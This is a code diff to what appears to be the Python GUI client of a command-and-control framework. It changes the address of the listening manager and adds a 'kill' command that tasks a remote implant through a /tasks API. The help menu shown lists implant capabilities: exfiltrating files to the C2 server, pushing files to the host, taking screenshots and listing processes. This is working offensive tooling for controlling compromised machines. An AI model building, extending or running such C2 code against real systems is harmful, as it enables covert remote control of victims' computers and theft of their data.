@@ -13,7 +13,7 @@ from time import sleep
 BR, FT, FR, FG, FY, FB, FM, FC, ST, SD, SB = B.RED, F.RESET, F.RED, F.GREEN, F.YELLOW, F.BLUE, F.MAGENTA, F.CYAN, S.RESET_ALL, S.DIM, S.BRIGHT
 
 # Configuration Settings
-listening_mgr_addr = "http://192.168.1.6:5000"
+listening_mgr_addr = "http://192.168.1.3:5000"
 beacon_IDs = [] # Our beacon array
 BeaconInteraction = False # Our switch between selection of beacons
 beacon_ID = "" # Our var to hold beacon data from list
@@ -143,6 +143,8 @@ class mainWidget(QtWidgets.QWidget):
             self.execCommand(subCommand)
         if metaCommand == "ps" and BeaconInteraction == True:
             self.listProcesses()
+        if metaCommand == "kill" and BeaconInteraction == True:
+            self.killAgent()
         if metaCommand == "clear":
             self.textEdit.clear()
         if metaCommand == "interact":
@@ -163,7 +165,8 @@ class mainWidget(QtWidgets.QWidget):
         r6 = "{0:<8s} -   {1}".format("download [filename]", "Tells implant to upload file to C2 server.")
         r7 = "{0:<8s} -   {1}".format("upload [filename]", "Tells implant to download file from C2 server to host.")
         r8 = "{0:<8s} -   {1}".format("screenshot", "Tells implant to take screenshot")
-        menu = "{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4, r5, r6, r7, r8)
+        r9 = "{0:<8s} -   {1}".format("kill", "Kills the implant")
+        menu = "{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4, r5, r6, r7, r8, r9)
         self.textEdit.append(TextColors.Green(menu))
     
     def clearCommandInput(self):
@@ -300,6 +303,13 @@ class mainWidget(QtWidgets.QWidget):
         self.textEdit.append("Command has been sent to implant\n")
         api_endpoint = "/tasks"
         request_payload_string = f'[{{"task_id":"{beacon_ID}","task_type":"list-processes"}}]'
+        request_payload = json.loads(request_payload_string)
+        api_post_request(api_endpoint, request_payload)
+    
+    def killAgent(self):
+        self.textEdit.append("Command has been sent to implant\n")
+        api_endpoint = "/tasks"
+        request_payload_string = f'[{{"task_id":"{beacon_ID}","task_type":"kill"}}]'
         request_payload = json.loads(request_payload_string)
         api_post_request(api_endpoint, request_payload)
     
